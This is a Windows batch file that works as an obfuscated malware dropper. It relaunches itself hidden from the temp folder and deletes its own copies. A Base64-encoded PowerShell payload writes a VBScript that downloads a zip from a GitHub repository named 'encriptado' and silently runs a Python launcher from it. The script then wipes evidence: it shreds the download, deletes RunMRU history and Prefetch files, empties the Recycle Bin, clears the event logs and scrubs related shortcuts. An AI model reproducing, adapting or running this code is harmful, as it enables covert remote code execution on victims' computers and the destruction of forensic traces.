@echo off
setlocal enabledelayedexpansion
chcp 65001 >nul 2>&1

if not "%1"=="x" (
    set "m=%TEMP%\~!RANDOM!!RANDOM!.bat"
    copy /y "%~f0" "!m!" >nul 2>&1
    start /b cmd /c "!m!" x
    timeout /t 1 /nobreak >nul 2>&1
    del /f /q "%~f0" >nul 2>&1
    exit /b
)

set "v=%TEMP%\~!RANDOM!.vbs"

powershell.exe -w h -nop -ep Bypass -c "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JABFcnJvckFjdGlvblByZWZlcmVuY2U9J1NpbGVudGx5Q29udGludWUnCiR2PSIkZW52OlRFTVBcfiQoKEdldC1SYW5kb20gLU1heCA5OTk5OTkpKS52YnMiCiR2YnM9QCcKT24gRXJyb3IgUmVzdW1lIE5leHQKU2V0IGZzPUNyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQpTZXQgc2g9Q3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKU2V0IG49Q3JlYXRlT2JqZWN0KCJNU1hNTDIuU2VydmVyWE1MSFRUUC42LjAiKQpzcD1XU2NyaXB0LlNjcmlwdEZ1bGxOYW1lCnNuPWZzLkdldEZpbGVOYW1lKHNwKQpzZD1mcy5HZXRQYXJlbnRGb2xkZXJOYW1lKHNwKQp0Yj1zaC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVURU1QJSIpCnVwPXNoLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncygiJVVTRVJQUk9GSUxFJSIpCkZ1bmN0aW9uIEdldERhdGEodXJsKQpPbiBFcnJvciBSZXN1bWUgTmV4dApuLm9wZW4gIkdFVCIsdXJsLEZhbHNlCm4uc2V0UmVxdWVzdEhlYWRlciAiVXNlci1BZ2VudCIsIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiIKbi5zZW5kCklmIG4uc3RhdHVzPTIwMCBUaGVuCkdldERhdGE9bi5yZXNwb25zZVRleHQKRWxzZQpHZXREYXRhPSIiCkVuZCBJZgpFbmQgRnVuY3Rpb24KRnVuY3Rpb24gU2hyZWQocGF0aCkKT24gRXJyb3IgUmVzdW1lIE5leHQKSWYgZnMuRmlsZUV4aXN0cyhwYXRoKSBUaGVuCnN6PWZzLkdldEZpbGUocGF0aCkuU2l6ZQpJZiBzej4wIEFuZCBzejwxMDAwMDAwMDAgVGhlbgpTZXQgZj1mcy5PcGVuVGV4dEZpbGUocGF0aCwyKQpGb3IgaT0xIFRvIDMKRm9yIGo9MSBUbyA1MDAKZi5Xcml0ZUxpbmUgU3RyaW5nKDgwLENocihJbnQoUm5kKjkzKSszMykpCk5leHQKTmV4dApmLkNsb3NlCkVuZCBJZgpmcy5EZWxldGVGaWxlIHBhdGgsVHJ1ZQpFbmQgSWYKRW5kIEZ1bmN0aW9uCklmIEluU3RyKExDYXNlKHNwKSxMQ2FzZSh0YikpPjAgQW5kIExDYXNlKHNuKT0iI3cudmJzIiBUaGVuCnVrPSJodHRwczovL2dpdGh1Yi5jb20vYnJheWFuamhvYW5jZTItY29sbGFiL2VuY3JpcHRhZG8vYXJjaGl2ZS9yZWZzL2hlYWRzL21haW4uemlwIgp6cD1zZCYiXHJlcG8uemlwIgplcD1zZCYiXGV4dHJhY3RlZCIKcHM9InBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiIiJbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sPVtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjskUHJvZ3Jlc3NQcmVmZXJlbmNlPSdTaWxlbnRseUNvbnRpbnVlJzt0cnl7SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAnIiZ1ayYiJyAtT3V0RmlsZSAnIiZ6cCYiJyAtVXNlQmFzaWNQYXJzaW5nIC1UaW1lb3V0U2VjIDEyMDtFeHBhbmQtQXJjaGl2ZSAtUGF0aCAnIiZ6cCYiJyAtRGVzdGluYXRpb25QYXRoICciJmVwJiInIC1Gb3JjZX1jYXRjaHtleGl0IDF9IiIiIgpzaC5SdW4gcHMsMCxUcnVlCldTY3JpcHQuU2xlZXAgODAwMApJZiBOb3QgZnMuRmlsZUV4aXN0cyh6cCkgVGhlbgpXU2NyaXB0LlF1aXQKRW5kIElmCldTY3JpcHQuU2xlZXAgMjAwMApycD0iIgpscD0iIgpwcD0iIgpJZiBmcy5Gb2xkZXJFeGlzdHMoZXApIFRoZW4KRm9yIEVhY2ggc2YgSW4gZnMuR2V0Rm9sZGVyKGVwKS5TdWJGb2xkZXJzCklmIExDYXNlKHNmLk5hbWUpPSJlbmNyaXB0YWRvLW1haW4iIFRoZW4KcnA9c2YuUGF0aApscD1ycCYiXGxhdW5jaGVyLnB5IgpwcD1ycCYiXHB5dGhvbl9wb3J0YWJsZVxweXRob24uZXhlIgpFeGl0IEZvcgpFbmQgSWYKTmV4dApFbmQgSWYKSWYgcnA8PiIiIEFuZCBmcy5GaWxlRXhpc3RzKGxwKSBBbmQgZnMuRmlsZUV4aXN0cyhwcCkgVGhlbgpzaC5DdXJyZW50RGlyZWN0b3J5PXJwCmNtZD0iIiIiJnBwJiIiIiAiIiImbHAmIiIiIgpzaC5SdW4gY21kLDAsRmFsc2UKV1NjcmlwdC5TbGVlcCAxMDAwMApFbmQgSWYKSWYgZnMuRmlsZUV4aXN0cyh6cCkgVGhlbgpzej1mcy5HZXRGaWxlKHpwKS5TaXplCklmIHN6PjAgQW5kIHN6PDEwMDAwMDAwMCBUaGVuCkZvciBwPTEgVG8gMwpwcz0icG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCAiIiIkYj1OZXctT2JqZWN0IGJ5dGVbXSAiJnN6JiI7KE5ldy1PYmplY3QgUmFuZG9tKS5OZXh0Qnl0ZXMoJGIpO1tJTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygnIiZ6cCYiJywkYikiIiIiCnNoLlJ1biBwcywwLFRydWUKV1NjcmlwdC5TbGVlcCA1MDAKTmV4dApFbmQgSWYKZnMuRGVsZXRlRmlsZSB6cCxUcnVlCkVuZCBJZgpzaC5SZWdEZWxldGUgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcUnVuTVJVXCIKcHM9InBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUNvbW1hbmQgIiIiJEVycm9yQWN0aW9uUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZSc7UmVtb3ZlLUl0ZW0gJ0M6XFdpbmRvd3NcUHJlZmV0Y2hcKi5wZicgLUZvcmNlO0NsZWFyLVJlY3ljbGVCaW4gLUZvcmNlIC1Db25maXJtOiRmYWxzZTt3ZXZ0dXRpbCBjbCBBcHBsaWNhdGlvbiAyPiRudWxsO3dldnR1dGlsIGNsIFN5c3RlbSAyPiRudWxsIiIiIgpzaC5SdW4gcHMsMCxUcnVlCldTY3JpcHQuU2xlZXAgMjAwMApjYj1zZCYiXGNsZWFudXAuYmF0IgpTZXQgZmM9ZnMuQ3JlYXRlVGV4dEZpbGUoY2IsVHJ1ZSkKZmMuV3JpdGVMaW5lICJAZWNobyBvZmYiCmZjLldyaXRlTGluZSAidGltZW91dCAvdCA4IC9ub2JyZWFrID5udWwiCmZjLldyaXRlTGluZSAidGFza2tpbGwgL2YgL2ltIHdzY3JpcHQuZXhlID5udWwgMj4mMSIKZmMuV3JpdGVMaW5lICJkZWwgL2YgL3EgIiIiJnNwJiIiIiA+bnVsIDI+JjEiCmZjLldyaXRlTGluZSAiY2QgL2QgJVRFTVAlIgpmYy5Xcml0ZUxpbmUgInJtZGlyIC9zIC9xICIiIiZzZCYiIiIgPm51bCAyPiYxIgpmYy5Xcml0ZUxpbmUgIihnb3RvKSAyPm51bCAmIGRlbCAvZiAvcSAiIiV+ZjAiIiAmIGV4aXQiCmZjLkNsb3NlCnNoLlJ1biAiY21kLmV4ZSAvYyAiIiImY2ImIiIiIiwwLEZhbHNlCldTY3JpcHQuUXVpdApFbHNlCnRpZD0ic3lzXyImSW50KFJuZCo5OTk5OTkrMTAwMDAwKQp0dz10YiYiXCImdGlkCmZzLkNyZWF0ZUZvbGRlciB0dwp2dD10dyYiXCN3LnZicyIKZnMuQ29weUZpbGUgc3AsdnQsVHJ1ZQpzaC5SdW4gIndzY3JpcHQuZXhlICIiIiZ2dCYiIiIgLy9CIC8vTm9sb2dvIiwwLEZhbHNlCldTY3JpcHQuU2xlZXAgMTAwMApmcy5EZWxldGVGaWxlIHNwLFRydWUKV1NjcmlwdC5RdWl0CkVuZCBJZgonQApbSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJHYsW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR2YnMpKQpTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAid3NjcmlwdC5leGUiIC1Bcmd1bWVudExpc3QgIiIkdiIiLC8vQiwvL05vbG9nbyIgLVdpbmRvd1N0eWxlIEhpZGRlbgpTdGFydC1TbGVlcCAyCiRsPSIkZW52OlVTRVJQUk9GSUxFIgpHZXQtQ2hpbGRJdGVtIC1QYXRoICRsIC1GaWx0ZXIgJyoubG5rJyAtUmVjdXJzZSAtRUEgU2lsZW50bHlDb250aW51ZXx3aGVyZS1vYmplY3R7JF8uTGVuZ3RoIC1sdCA1MDAwfXxmb3JlYWNoLW9iamVjdHt0cnl7JHM9TmV3LU9iamVjdCAtQ09NIFdTY3JpcHQuU2hlbGw7JHQ9JHMuQ3JlYXRlU2hvcnRjdXQoJF8uRnVsbE5hbWUpO2lmKCR0LkFyZ3VtZW50cyAtbWF0Y2ggJ2l3cnxnaXRodWJ8YmF0Jyl7JGM9JF8uRnVsbE5hbWU7MS4uM3xmb3JlYWNoLW9iamVjdHtbSU8uRmlsZV06OldyaXRlQWxsVGV4dCgkYywoW2NoYXJbXV0oMS4uKCRfLkxlbmd0aCl8Zm9yZWFjaC1vYmplY3R7NjUrKEdldC1SYW5kb20gLU1heCAyNil9KSAtam9pbiAnJykpfTtSZW1vdmUtSXRlbSAkYyAtRm9yY2UgLUVBIFNpbGVudGx5Q29udGludWV9fWNhdGNoe319ClJlbW92ZS1JdGVtICdIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxSdW5NUlUnIC1SZWN1cnNlIC1Gb3JjZSAtRUEgU2lsZW50bHlDb250aW51ZQpSZW1vdmUtSXRlbSAnQzpcV2luZG93c1xQcmVmZXRjaFwqLnBmJyAtRm9yY2UgLUVBIFNpbGVudGx5Q29udGludWUKQ2xlYXItUmVjeWNsZUJpbiAtRm9yY2UgLUNvbmZpcm06JGZhbHNlIC1FQSBTaWxlbnRseUNvbnRpbnVlCndldnR1dGlsIGNsIEFwcGxpY2F0aW9uIDI+JG51bGwKd2V2dHV0aWwgY2wgU3lzdGVtIDI+JG51bGw=')))"

timeout /t 1 /nobreak >nul

del /f /q "%~f0" >nul 2>&1
exit